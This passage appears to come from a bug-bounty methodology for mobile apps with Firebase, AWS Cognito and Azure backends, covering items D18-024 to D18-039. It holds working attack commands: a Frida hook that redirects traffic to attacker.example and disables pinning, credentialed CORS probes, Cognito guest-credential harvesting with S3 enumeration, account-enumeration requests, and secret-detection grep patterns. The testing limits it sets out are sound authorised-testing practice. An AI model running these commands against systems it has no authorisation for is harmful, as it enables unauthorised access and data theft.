| **Applies to** | Apps using Remote Config or an equivalent flag service (LaunchDarkly, Optimizely, in-house) |
| **Requires** | firebase |
| **Maps to** | Firebase Remote Config documentation ("Don't store confidential data in Remote Config parameter keys or values" — end users can access these values); MASWE-0004 |

- **Test:** Teams move a secret out of `strings.xml` into Remote Config believing that hides it. It does not: the value is delivered to every install and cached in plain XML on the device. Distinguish this from D18-023 — here the payload holds a *credential*, not merely config.
- **How:** Take the `entries` object from D18-023 and run every value through the D18-004 prefix set and the D18-009 restriction gate:
```bash
curl -s -X POST "https://firebaseremoteconfig.googleapis.com/v1/projects/$P/namespaces/firebase:fetch?key=$K" \
  -H 'Content-Type: application/json' -d "{\"app_instance_id\":\"probe\",\"app_id\":\"$APPID\"}" \
  | jq -r '.entries | to_entries[] | "\(.key)=\(.value)"' > rc_entries.txt
grep -nE 'AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_live_|xox[baprs]-|SG\.|-----BEGIN' rc_entries.txt
grep -niE 'secret|password|token|private|signing|hmac|salt' rc_entries.txt
```
- **Proof:** The parameter key and value, plus a successful authenticated call to the corresponding vendor API using it. Report the *credential* finding, and note the delivery channel as the reason rotation alone is insufficient.
- **Escalation:** Same as any live credential; additionally note that the value is in the on-device cache of every install, so device-level compromise is not required.
- **Ruled out when:** Every value in `entries` is a flag, a string, a numeric threshold or a public URL — and each one has been checked against the prefix set, not eyeballed. Record the entry count you reviewed.

### D18-025 · Remote Config (or any server-delivered config) used as a trust boundary

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4) alone; rate up to the control it disables — e.g. `broken_authentication_and_session_management.authentication_bypass` (P1) if a flag turns off a server-enforced check |
| **Attacker** | AM-09 malicious backend/CDN, or AM-06/AM-07 on an unpinned config fetch |
| **Applies to** | Apps that read a config value into a security decision |
| **Requires** | backend-api, mitm |
| **Maps to** | Firebase Remote Config value priority (fetched values outrank in-app defaults); API10:2023 Unsafe Consumption of APIs |

- **Test:** Find config values that gate security behaviour — API base URL, "enforce pinning", "require signature", a maximum transaction amount, a fraud threshold — then override them and observe the consequence. If the client obeys, whoever can influence or intercept the config controls the app.
- **How:**
```bash
grep -rn 'FirebaseRemoteConfig\|getString(\|getBoolean(\|getLong(\|getDouble(' $S/ \
  | grep -iE 'url|host|endpoint|enable|require|pin|verify|cert|max|limit|threshold|fraud|debug'
```
```javascript
// Frida: log every read, then substitute one value
Java.perform(function () {
  var RC = Java.use('com.google.firebase.remoteconfig.FirebaseRemoteConfig');
  RC.getString.implementation = function (k) {
    var v = this.getString(k);
    console.log('[rc:string] ' + k + ' = ' + v);
    if (k === 'api_base_url') return 'https://attacker.example/';
    return v;
  };
  RC.getBoolean.implementation = function (k) {
    var v = this.getBoolean(k);
    console.log('[rc:bool] ' + k + ' = ' + v);
    if (k === 'enforce_pinning') return false;
    return v;
  };
});
```
  Then repeat the same substitution by editing the fetch **response** in the proxy, which is the version that corresponds to a real attacker position.
- **Proof:** The app issuing authenticated requests to the substituted host, or skipping a signature because a boolean flipped — captured in the proxy, with the modified config response shown beside it. Screenshot the changed app behaviour, not just the changed value.
- **Escalation:** -> D14 (a mutable base URL under an on-path attacker), -> D17 (config as a code-delivery channel), -> D23 (a client-obeyed transaction limit). If the config fetch itself is not pinned, an AM-06 attacker sets these values without needing the vendor's console.
- **Ruled out when:** Every security-relevant decision is re-checked server-side — you flipped the flag, the client changed, and the server still rejected the resulting request. That server rejection is the true negative; a client that ignores the flag is a weaker one but also acceptable if you show the code path.

### D18-026 · Remote Config conditions: the values you do not see exist for another cohort

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) when a cohort-only value exposes internal infrastructure |
| **Attacker** | AM-01 |
| **Applies to** | Apps using Remote Config conditions |
| **Requires** | firebase |
| **Maps to** | Firebase Remote Config conditions (targeting by app version, platform, user property, country, random percentile) |

- **Test:** A single fetch shows you one cohort's template. Conditions target by app version, platform, user property, country and random percentile, so a default fetch can be empty while an internal-build cohort receives the staging endpoints. Vary the fetch parameters.
- **How:**
```bash
for V in 1.0.0 2.0.0 99.0.0; do
 for C in GB US IN DE; do
  echo "== appVersion=$V country=$C"
  curl -s -X POST "https://firebaseremoteconfig.googleapis.com/v1/projects/$P/namespaces/firebase:fetch?key=$K" \
    -H 'Content-Type: application/json' \
    -d "{\"app_instance_id\":\"probe-$V-$C\",\"app_id\":\"$APPID\",\"app_version\":\"$V\",\"country_code\":\"$C\",\"language_code\":\"en-GB\"}" \
    | jq -c '.entries // .state'
 done
done
```
  Vary `app_instance_id` repeatedly as well — random-percentile conditions resolve per instance id, so a new id can land you in a different bucket.
- **Proof:** A parameter set returned for one cohort and absent for another, with the two responses side by side.
- **Escalation:** Cohort-only endpoints are the highest-value leak here; they are usually staging, which feeds -> D18-068 shadow API and -> D15.
- **Ruled out when:** The `entries` object is byte-identical across at least three app versions, four country codes and ten distinct `app_instance_id` values. Diff the bodies; do not compare lengths.

### D18-027 · Cloud Functions, function URLs and API Gateway stages reachable without the app

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) for an unauthenticated privileged callable; `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when it takes an object id |
| **Attacker** | AM-01 |
| **Applies to** | Apps using Firebase callable functions, Lambda function URLs, API Gateway stages or Cloud Run |
| **Requires** | backend-api |
| **Maps to** | API5:2023 Broken Function Level Authorization, API1:2023 |

- **Test:** These are plain internet-facing HTTP endpoints; the SDK wrapper in the app is not a control. Critically, a function usually runs with the Firebase Admin SDK, which **ignores every Firestore/RTDB/Storage rule you just tested** — so a hardened rules set means nothing here.
- **How:**
```bash
grep -rniE 'cloudfunctions\.net|lambda-url\.[a-z0-9-]+\.on\.aws|execute-api\.[a-z0-9-]+\.amazonaws\.com|\.run\.app|httpsCallable\(' \
  $S/ $R $A | sort -u
FN=https://us-central1-<project>.cloudfunctions.net/<fn>
# unauthenticated; callables take {"data": …} and return {"result": …}
curl -s -i -X POST "$FN" -H 'Content-Type: application/json' -d '{"data":{}}' | head -20
# with your own ID token
curl -s -X POST "$FN" -H "Authorization: Bearer $ID_TOKEN" -H 'Content-Type: application/json' \
  -d '{"data":{"userId":"'"$OTHER_UID"'"}}' | head -c 400
# and with an App Check header absent (see D18-029)
```
- **Proof:** A `result` returned for an unauthenticated call, or a `result` for a call parameterised with another user's identifier. Show the request and response in full, with the victim's values masked but the key names and your own uid visible.
- **Escalation:** One unauthenticated callable running with admin credentials reads the entire database regardless of rules quality — state this explicitly in the report, because it is the reason the client cannot fix it in the rules file.
- **Ruled out when:** Every discovered function returns `UNAUTHENTICATED`/401 without a token, and with your own token returns only your own data for a second account's identifier. Test the **layer order** before claiming a bypass: see D18-069 — a `400 "data is required"` from an unauthenticated call does not mean you passed auth.

### D18-028 · Identity Toolkit as an account-enumeration and provider-disclosure oracle

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.username_enumeration.non_brute_force` (P4); the provider disclosure additionally enables `server_security_misconfiguration.oauth_misconfiguration.account_squatting` (P4); `server_security_misconfiguration.no_rate_limiting_on_form.email_triggering` (P4) for the unthrottled mail trigger |
| **Attacker** | AM-01 |
| **Applies to** | Firebase Auth projects whose key is not application-restricted (D18-009) |
| **Requires** | firebase |
| **Maps to** | API2:2023 |

- **Test:** Several Identity Toolkit endpoints differentiate existing from non-existing accounts, and `createAuthUri` additionally discloses which sign-in providers each account uses — which tells an attacker exactly which social-login or password path to attack.
- **How:**
```bash
K=<google_api_key>
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$K" \
  -H 'Content-Type: application/json' \
  -d '{"identifier":"you@example.com","continueUri":"http://localhost"}' | jq '{registered, allProviders, signinMethods}'
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=$K" \
  -H 'Content-Type: application/json' \
  -d '{"email":"you@example.com","password":"deliberately-wrong","returnSecureToken":true}' | jq -r '.error.message'
```
  Compare `EMAIL_NOT_FOUND` against `INVALID_PASSWORD`, and `registered: true` against `false`.
```bash
# key-only MUTATING endpoint, own addresses only: branded mail to any address; count the mails — 6 interleaved sends with no TOO_MANY_ATTEMPTS_TRY_LATER = unthrottled
for i in 1 2 3 4 5 6; do curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=$K" -H 'Content-Type: application/json' \
  -d '{"requestType":"PASSWORD_RESET","email":"you@yourdomain.example","continueUrl":"https://<domain-you-control>/"}' | jq -c '{email, error: .error.message}'; done
```
  `INVALID_CONTINUE_URI` / `UNAUTHORIZED_DOMAIN` = the authorised-domains list is enforced (good); `email` echoed 6/6 with your domain accepted = a brandable phishing link plus a mail-bomb primitive.
- **Proof:** A stable differential between an address you own and a known-absent address, reproduced at least six times each, with the two response bodies. Enumerate only addresses you own. For the mail trigger: the six response bodies and the received-mail headers.
- **Escalation:** Provider disclosure -> targeted OAuth account-linking and squatting; combined with any unthrottled password endpoint it rises to High.
- **Ruled out when:** The key is application-restricted (D18-009 negative), or both endpoints return the same response for existing and non-existing identifiers across the six-sample comparison. Compare response **bodies**, not status codes (D18-071).

### D18-029 · Firebase App Check absent, monitoring-only, or shipping the debug provider in a release build

| | |
|---|---|
| **Severity ceiling** | High (a shipped debug provider/token in release); Medium standalone as a missing defence-in-depth control |
| **VRT** | `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4) standalone; it is the *missing mitigation* line on every rules finding above |
| **Attacker** | AM-01 |
| **Applies to** | Apps using Firebase/GCP-backed services or the App Check custom-backend integration |
| **Requires** | firebase |
| **Maps to** | `firebase.google.com/docs/app-check` — Play Integrity provider on Android; protects Cloud Firestore, Realtime Database, Cloud Storage, callable Cloud Functions, Firebase Authentication (Preview) and custom backends; debug providers are local-development-only |

- **Test:** App Check is the control that makes "only our app may call this backend" true. Without it, every finding in D18-014 through D18-027 is reachable from `curl`. Check three things: whether the app initialises App Check at all, whether the project enforces it, and whether a debug provider or a debug token shipped in the release build.
- **How:**
```bash
grep -rnE 'FirebaseAppCheck|installAppCheckProviderFactory|PlayIntegrityAppCheckProviderFactory|DebugAppCheckProviderFactory|SafetyNetAppCheckProviderFactory|firebase_app_check_debug_token' \
  $S $R
# is enforcement on?  a valid ID token, no App Check header
curl -s -i -X POST "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents:runQuery" \
  -H "Authorization: Bearer $ID_TOKEN" -H 'Content-Type: application/json' \
  -d '{"structuredQuery":{"from":[{"collectionId":"users"}],"limit":1}}' | head -5
```
- **Proof:** A 200 with document data from a plain `curl` carrying no `X-Firebase-AppCheck` header, together with the absence of `installAppCheckProviderFactory` in the decompiled source. If a debug provider is present in the release APK, show the class reference and the shipped debug-token resource — that is a permanent enforcement bypass and is a finding on its own.
- **Escalation:** Write it as the missing-mitigation line in every Firebase rules finding. It is what turns a triager's "that's only reachable from the app" into "that is reachable from anywhere", which is a full attacker-model band.
- **Ruled out when:** `PlayIntegrityAppCheckProviderFactory` is installed in the release build, no debug provider or debug token is present, and the header-less `curl` above is rejected with an App Check error. Note `SafetyNetAppCheckProviderFactory` is the **LEGACY** provider — its presence is not equivalent to enforcement on a current project; check what the backend actually rejects.

### D18-030 · The `appspot.com` / App Engine variant and its CORS posture

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if credentialed cross-origin reads of authenticated data are possible |
| **Attacker** | AM-02 remote, one click (a web page the victim visits) |
| **Applies to** | Firebase/GCP projects with an App Engine or Cloud Run surface on the same project |
| **Requires** | firebase |
| **Maps to** | Firebase/App Engine default hostnames; API8:2023 |

- **Test:** The same project id usually also answers on `<project>.appspot.com`. Probe it separately, and check its CORS response — a permissive `Access-Control-Allow-Origin` with credentials turns a same-project API into browser-reachable data theft.
- **How:**
```bash
curl -s -i "https://<project>.appspot.com/.json" -H 'Origin: https://evil.example' | head -30
curl -s -i "https://<project>.appspot.com/" -H 'Origin: https://evil.example' \
  | grep -iE 'HTTP/|access-control-allow-(origin|credentials)'
curl -s -i -X OPTIONS "https://<project>.appspot.com/api/" \
  -H 'Origin: https://evil.example' -H 'Access-Control-Request-Method: GET' | head -20
```
- **Proof:** A 200 whose `Access-Control-Allow-Origin` reflects your origin **and** which carries `Access-Control-Allow-Credentials: true`, against a path that returns authenticated data. Without the credentialed-read demonstration this is not a finding — a wildcard ACAO without a credential-exfil PoC is on the never-submit list.
- **Escalation:** -> D15 for the web asset; the authenticated-read PoC is the web half of the same account's data exposure.
- **Ruled out when:** `<project>.appspot.com` does not resolve or returns 404 for every probed path, or the ACAO header is absent/fixed to the vendor's own origins. Record the header values.

### D18-031 · Legacy FCM server key shipped in the package (LEGACY — verify the endpoint is still live)

| | |
|---|---|
| **Severity ceiling** | Low (P5 graveyard since the 2024 shutdown; the High/Critical ceiling of this class now lives in D18-032 and D18-074) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` (P5) — a key for an endpoint that no longer exists; rotation-hygiene note in the D18-032 report |
| **Attacker** | AM-01 |
| **Applies to** | FCM apps. **LEGACY:** the `Authorization: key=` server-key endpoint belongs to the legacy FCM HTTP API, superseded by the OAuth2/service-account HTTP v1 API — on a current project the modern equivalent is D18-032 |
| **Requires** | firebase, push |
| **Maps to** | Google ASI campaign "Exposed Firebase Cloud Messaging Server Keys" (started 2021-10-12, `support.google.com/faqs/topic/11015404`); H1 #789370 (Smule, Critical, CWE "Use of Hard-coded Credentials"); CWE-798 |

- **Test:** The legacy HTTP/XMPP FCM API was deprecated on 2023-06-20 and shut down on 2024-07-22; an `AAAA…:APA91b…` server key no longer sends anything. Its remaining value: it proves the project once shipped a server credential, which makes D18-007's older-build sweep for a service-account JSON (D18-032) mandatory, and the key's presence is a rotation-hygiene note in the D18-032 report. The live mass-messaging credential classes are the service-account JSON (D18-032) and the push-vendor REST key (D18-074).
- **How:**
```bash
grep -rnE 'AAAA[A-Za-z0-9_-]{7}:APA91b[A-Za-z0-9_-]{100,}' "$DEC" | sort -u
grep -rnE 'AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140}' "$DEC" | sort -u
grep -rn 'server_key\|notification_server_key\|google_notification_key\|legacy_server_key' \
  $R/values/*.xml $A/ $S/ 2>/dev/null
curl -s -o /dev/null -w '%{http_code}\n' -X POST https://fcm.googleapis.com/fcm/send \
  -H "Authorization: key=$SERVER_KEY" -H 'Content-Type: application/json' -d '{"registration_ids":["ABC"]}'   # expect 404 for every key since the 2024 shutdown; anything else means the endpoint came back — re-read this item
```
- **Proof:** The grep hit with `file:line` and the 404; nothing more. Never send to `/topics/…`, `condition` expressions or `registration_ids` you did not generate on any endpoint that does answer — report the fleet-wide targeting form, never execute it.
- **Escalation:** None for the legacy key itself. The push-as-remote-control chain (a `FirebaseMessagingService` that acts on message contents — D18-034) now starts from D18-032 (service-account JSON) or D18-074 (vendor REST key). Google's own remediation note still applies to those: removing the credential from the current build does not fix it, because it is still in an older version (D18-007).
- **Ruled out when:** Trivially since the shutdown — record the 404 once per key found, and move the budget to D18-032 (service-account JSON in any build) and D18-074 (vendor push REST key).

### D18-032 · Google service-account JSON shipped in the package (the modern, worse equivalent)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Any app whose package contains a `"type": "service_account"` JSON, in assets, raw resources, a native blob or a JS bundle |
| **Requires** | firebase, push |
| **Maps to** | API8:2023; CWE-798; apkleaks `Google_Cloud_Platform_Service_Account` rule |

- **Test:** With FCM HTTP v1 the send credential is an OAuth2 service account, not a server key. A service account typically grants far more than push — it is a GCP principal, and its role set decides the severity.
- **How:**
```bash
grep -rln '"type": *"service_account"' "$DEC" 2>/dev/null
unzip -l target.apk | grep -iE '\.json$' | grep -iE 'service|account|credential|firebase-adminsdk'
# validate scope only — authenticate, describe, stop
gcloud auth activate-service-account --key-file=svc.json
gcloud auth list
gcloud projects describe <project> 2>&1 | head
gcloud projects get-iam-policy <project> --flatten='bindings[].members' \
  --filter="bindings.members:$(jq -r .client_email svc.json)" --format='value(bindings.role)'
gcloud auth revoke --all
```
- **Proof:** `gcloud auth list` showing the activated service-account email from the APK, plus the role bindings it holds. Stop at scope confirmation. Do not read data, do not send push, do not enumerate resources beyond the IAM read unless the brief explicitly permits it.
- **Escalation:** -> cloud-plane compromise; a service account with `roles/datastore.user` or `roles/storage.admin` bypasses every security rule tested in D18-014 to D18-022. File it as a primitive (D18-071) and reference it from the data findings.
- **Ruled out when:** No `"type": "service_account"` string exists in any layer of the package including native blobs and bundles (D18-003 run first), or the key file present is a test-project account whose `project_id` differs from the production project and which fails activation. Record the `client_email` and `project_id` of anything you found.

### D18-033 · Sender id is not a server key — the calibration that prevents the downgrade

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` (P5) for the sender id |
| **Attacker** | n/a |
| **Applies to** | All FCM apps |
| **Requires** | firebase, push |
| **Maps to** | H1 #941590 (Hostinger — GCM sender key, rated **Low**) versus H1 #789370 (Smule — server key, rated **Critical**) |

- **Test:** `gcm_defaultSenderId` and `google_app_id` are client identifiers and belong in the package by design. Confusing one for a server key is, in the corpus's words, the fastest way to have the report downgraded. Before filing anything push-related, state which credential you hold and show the authentication result.
- **How:**
```bash
grep -n 'gcm_defaultSenderId\|google_app_id\|google_api_key' $R/values/strings.xml
# a sender id is numeric (e.g. 1234567890123); a server key is AAAA…:APA91b…; a v1 credential is a JSON file
# prove the distinction in the report on the v1 endpoint (the legacy /fcm/send endpoint answers 404 to everything since 2024-07-22):
curl -s -X POST "https://fcm.googleapis.com/v1/projects/$P/messages:send" -H "Authorization: Bearer <sender_id>" -d '{}' | jq -r '.error.status'   # UNAUTHENTICATED = a client identifier, not a credential
```
- **Proof:** The `UNAUTHENTICATED` from the sender-id attempt on the v1 endpoint alongside the service-account result of D18-032 (if you have one). Where you only have the sender id, record it as a P5 graveyard row with that response.
- **Escalation:** None on its own. Its value is preventing a bad filing and preserving credibility for the real findings in the same report.
- **Ruled out when:** Trivially — this item is a calibration step, not a test. It is "done" when every push-related credential in the identity table carries an explicit kind (`sender_id` / `legacy_server_key` / `service_account`) and an authentication result.

### D18-034 · The push data-message handler as a remote-control channel

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES — rated on what the handler does) |
| **Attacker** | AM-01 once you hold a send credential; AM-03 where the messaging receiver is reachable locally |
| **Applies to** | Apps whose `FirebaseMessagingService` acts on message contents |
| **Requires** | push, device |
| **Maps to** | ATT&CK T1437.001 Web Protocols (ATT&CK names GCM/FCM/APNS as blend-in channels); ATT&CK T1481.002 |

- **Test:** A stolen send credential is worth far more when the app *acts* on data messages: opens a deep link, loads a URL in a WebView, writes config, or triggers a silent action. Read the handler before rating D18-031/-032.
- **How:**
```bash
grep -rn 'FirebaseMessagingService\|onMessageReceived\|RemoteMessage\|getData()\|getNotification()' $S/
grep -n -A8 'com.google.firebase.MESSAGING_EVENT' $MF
# check the messaging service is guarded by the signature permission
grep -n -B2 -A6 'com.google.android.c2dm.permission.SEND' $MF
# locally, try delivering a crafted message intent
adb shell am broadcast -n <pkg>/<receiver> -a com.google.android.c2dm.intent.RECEIVE \
  --es 'deeplink' 'https://attacker.example/'
```
- **Proof:** The app performing the handler's action on a payload you supplied — deep link opened, WebView loaded, config written — screen-recorded, with the message body shown. Deliver it to your own device token only.
- **Escalation:** -> D09 deep links and -> D10 WebView from a purely remote position; -> D24 push abuse. This is the sentence that takes D18-031 from High to Critical.
- **Ruled out when:** `onMessageReceived` only calls `NotificationCompat` with a title and body and never parses a URL, never calls `startActivity`, never writes to `SharedPreferences`, and the messaging service is declared with the `com.google.android.c2dm.permission.SEND` signature guard. Quote the handler body.

### D18-035 · Long-lived AWS credentials in the package: prove scope, then stop

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` (P1); `…overly_permissive_iam_roles` (P2) for the policy itself |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Requires** | — |
| **Maps to** | CWE-798; MASWE-0004; Cobalt "Mobile Vulnerabilities: Pen tester's guide" real-life example #1 (extracted AWS key with excessive IAM permissions, rated **Critical**) |

- **Test:** An `AKIA…`/`ASIA…` key is only as severe as its IAM policy. Enumerate the policy; do not pivot into production.
- **How:**
```bash
grep -rhoE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}' "$DEC" | sort -u
grep -rhoE 'aws_secret_access_key["[:space:]:=]+[A-Za-z0-9/+=]{40}' "$DEC" | sort -u
for so in $L/*/*.so; do strings -n 12 "$so" | grep -E 'AKIA[0-9A-Z]{16}'; done
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity
aws iam get-user 2>&1 | head -3
aws iam list-attached-user-policies --user-name <name> 2>&1 | head
aws iam list-user-policies --user-name <name> 2>&1 | head
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY
```
- **Proof:** The `GetCallerIdentity` ARN, the attached policy names, and the APK path/line the credential came from. Nothing more. Quote the boundary in the report: *"When you discover credentials, verify they're real by checking if they authenticate — but never access production systems or data. Report your finding immediately without further testing to avoid legal issues."* Per HackerOne's leaked-credential standard, authenticate and immediately deauthenticate.
- **Escalation:** -> cloud account compromise. File as a primitive first (D18-071); the S3 data findings that depend on it are separate reports.
- **Ruled out when:** No `AKIA`/`ASIA` string in any layer, or every candidate returns `InvalidClientTokenId`/`SignatureDoesNotMatch` from `sts get-caller-identity`. Record the exact AWS error. Note that some programs forbid even `get-caller-identity` on out-of-scope accounts — Intigriti's standards state active testing on assets not explicitly in scope earns no bounty "and may result in sanctions"; if so, report the credential's presence with the code path and stop there.

### D18-036 · AWS Cognito identity pool with guest (unauthenticated) access

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` (P1); `…overly_permissive_iam_roles` (P2) |
| **Attacker** | AM-01 |
| **Applies to** | AWS Amplify / Cognito-backed apps |
| **Requires** | — |
| **Maps to** | Amazon Cognito identity pools documentation — guest access "provides a unique identifier and AWS credentials for users who do not authenticate with an identity provider"; each identity type has an assigned IAM role whose policy "dictates which AWS services that role can access"; API8:2023 |

- **Test:** An identity-pool id in the APK plus enabled guest access hands anyone temporary AWS credentials under the pool's *unauthenticated* IAM role. The pool id is not a secret; the role's policy is the finding.
- **How:**
```bash
grep -rniE 'us-[a-z]+-[0-9]:[0-9a-f-]{8}-[0-9a-f-]{4}-[0-9a-f-]{4}-[0-9a-f-]{4}-[0-9a-f]{12}|cognito-identity|identityPoolId|amplifyconfiguration|awsconfiguration' \
  $R $A $S | sort -u
POOL=us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
REGION=us-east-1
unset AWS_PROFILE AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN   # the pool call must carry no identity of yours
# both APIs are unauthenticated but the CLI still signs them: without --no-sign-request it fails 'Unable to locate credentials' (reads as guest disabled) or signs with YOUR account
ID=$(aws cognito-identity get-id --identity-pool-id "$POOL" --region $REGION --query IdentityId --output text --no-sign-request)
aws cognito-identity get-credentials-for-identity --identity-id "$ID" --region $REGION --no-sign-request > creds.json
export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretKey creds.json)
export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken creds.json)
aws sts get-caller-identity
aws s3 ls 2>&1 | head ; aws dynamodb list-tables 2>&1 | head ; aws lambda list-functions 2>&1 | head -20
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```
- **Proof:** `get-caller-identity` returning an assumed-role ARN that names the pool's *unauth* role, followed by **one** successful data operation that an anonymous internet user should not be able to perform. `get-caller-identity` also discloses the account id, which is itself worth recording.
- **Escalation:** -> D18-039/-040 if the role reaches S3; -> D15 if it reaches an API Gateway with IAM auth. An over-broad *authenticated* role is the same finding one sign-up later — see D18-037.
- **Ruled out when:** `get-id` returns `NotAuthorizedException` **with `--no-sign-request` present in the command you paste** (guest access disabled), or the credentials resolve to a role whose every probed action returns `AccessDenied`. List the actions you probed; a negative on an unnamed action set is not a negative.

### D18-037 · Cognito *authenticated* role over-scope — one sign-up away

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cloud_security.identity_and_access_management_iam_misconfigurations.overly_permissive_iam_roles` (P2); P1 when it yields cross-tenant data |
| **Attacker** | AM-01 (self-registration) or AM-05 |
| **Applies to** | Cognito user-pool + identity-pool apps |
| **Requires** | two-accounts |
| **Maps to** | Amazon Cognito identity pools documentation (per-identity-type IAM roles); API1:2023 |

- **Test:** Teams disable guest access and consider the pool hardened, while the *authenticated* role still carries `s3:*` or an unscoped DynamoDB policy. Register normally through the app, then exchange the user-pool token for AWS credentials and enumerate.
- **How:**
```bash
# sign up / sign in through the app, capture the Cognito id token from the proxy, then:
unset AWS_PROFILE AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN   # no identity of yours on the pool call
ID=$(aws cognito-identity get-id --identity-pool-id "$POOL" --region $REGION --no-sign-request \
     --logins "cognito-idp.$REGION.amazonaws.com/$USERPOOL=$COGNITO_ID_TOKEN" --query IdentityId --output text)
aws cognito-identity get-credentials-for-identity --identity-id "$ID" --region $REGION --no-sign-request \
  --logins "cognito-idp.$REGION.amazonaws.com/$USERPOOL=$COGNITO_ID_TOKEN" > creds.json
# then the same enumeration as D18-036, and specifically test whether the policy is scoped by identity
aws s3 ls s3://<app-bucket>/ --recursive 2>&1 | head
aws s3 ls s3://<app-bucket>/private/ 2>&1 | head    # Amplify's per-identity prefix convention
```
  Amplify's storage convention places per-user objects under `private/<identityId>/`; test whether your role can list and read **another** identity's prefix.
- **Proof:** Your own `IdentityId`, shown, alongside a successful listing or object read under a different `IdentityId` prefix. Two accounts you control.
- **Escalation:** -> D18-043 object-key IDOR; -> D20 for the data class exposed.
- **Ruled out when:** With a second self-registered account's identity id, every cross-prefix operation returns `AccessDenied`, and the role's policy (if readable) uses `${cognito-identity.amazonaws.com:sub}` in the resource ARN. Show the two identity ids and the denial.

### D18-038 · Azure storage connection strings and SAS tokens in the package

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` (P1); `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies) |
| **Attacker** | AM-01 |
| **Applies to** | Apps using Azure Blob/Table/Queue storage or an Azure-backed SDK |
| **Requires** | — |
| **Maps to** | CWE-798; MASWE-0004; API8:2023 |

- **Test:** Azure ships its credential as a single connection string (`DefaultEndpointsProtocol=…;AccountName=…;AccountKey=…`) or as a shared-access-signature URL. The account key is an account-wide credential; a SAS is scoped but frequently over-scoped and long-lived.
- **How:**
```bash
grep -rnoE 'DefaultEndpointsProtocol=[^"]+AccountKey=[A-Za-z0-9+/=]{60,}' "$DEC" | sort -u
grep -rnoE 'SharedAccessSignature|[a-z0-9]+\.blob\.core\.windows\.net/[A-Za-z0-9._-]+' "$DEC" | sort -u
grep -rnoE 'sv=20[0-9]{2}-[0-9]{2}-[0-9]{2}&[^"'\'' ]*sig=[A-Za-z0-9%+/=]{20,}' "$DEC" | sort -u
# container listing with a recovered SAS (read-only)
curl -s "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list&<SAS>" | head -c 800
# anonymous container listing, no credential at all
curl -s -i "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list" | head -5
# decode the SAS permissions and expiry from its own parameters
python3 -c "import urllib.parse,sys;print(urllib.parse.parse_qs(sys.argv[1]))" '<SAS-query-string>'
```
- **Proof:** An `EnumerationResults` XML listing returned with only material from the APK, plus the decoded SAS showing `sp=` (permissions — `rwdl` is read/write/delete/list) and `se=` (expiry). A SAS granting write or delete, or with a multi-year expiry, is the specific finding.
- **Escalation:** -> D18-043; a writable container the app renders from is content injection -> D10.
- **Ruled out when:** No connection string or SAS in any layer; or the recovered SAS is read-only (`sp=r`), scoped to a single blob, and already expired. Paste the decoded parameters.

### D18-039 · Object-storage buckets named in the package: anonymous listing

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (VARIES — rate on demonstrated data); `cloud_security.storage_misconfigurations.unencrypted_sensitive_data_at_rest` (P2) |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Requires** | — |
| **Maps to** | Mobile Top 10 2024 M9 (its own example list includes "misconfiguring cloud storage permissions—allowing unauthorized data access") and M8; MASWE-0004; API8:2023; Xiaomi General Assessment Rules ("whether the data or link should have access restricted" and "the sensitivity of the data or link exposed to the public" — pre-answer both in the report) |

- **Test:** Harvest every bucket/container/CDN host from the package and test anonymous listing on each. Bucket names embedded in the client are frequently readable without credentials.
- **How:**
```bash
